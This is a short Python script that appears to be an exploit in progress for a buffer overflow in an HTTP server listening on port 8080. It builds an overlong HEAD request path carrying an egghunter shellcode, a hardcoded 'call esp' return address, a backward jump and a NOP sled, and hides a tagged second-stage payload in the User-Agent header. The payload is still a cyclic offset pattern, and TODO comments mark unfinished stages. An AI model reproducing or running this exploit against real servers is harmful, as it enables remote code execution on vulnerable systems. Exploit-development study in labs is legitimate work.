import socket
import os
import sys
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
##TO DO send in stages 1.egghunter overwrite jmp-120 2. tag shellcode

#Egghunter , tag dude : 
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#Put this tag in front of your shellcode : dudedude

#pattern 400 bytes
shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

#call esp 77AE57CE   ntdll
#jump back nasm $-120 EB 86
#adjust size for egghunter
stuff = "A"*473 + egghunter + "\x90"*10 + "\xce\x57\xae\x77" + "\xeb\x86" + "X"*80

#put otherstuff in buffer User-Agent??
otherstuff = "dudedude" + shellcode



buffer =  "HEAD /" + stuff + " HTTP/1.1\r\n"
buffer += "Host: 172.16.0.24:8080\r\n"
buffer += "User-Agent: " + otherstuff+ "\r\n"
buffer += "Keep-Alive: 115\r\n"
buffer += "Connection: keep-alive\r\n\r\n"
 
s.connect(("127.0.0.1", 8080))
s.send(buffer)
s.close()
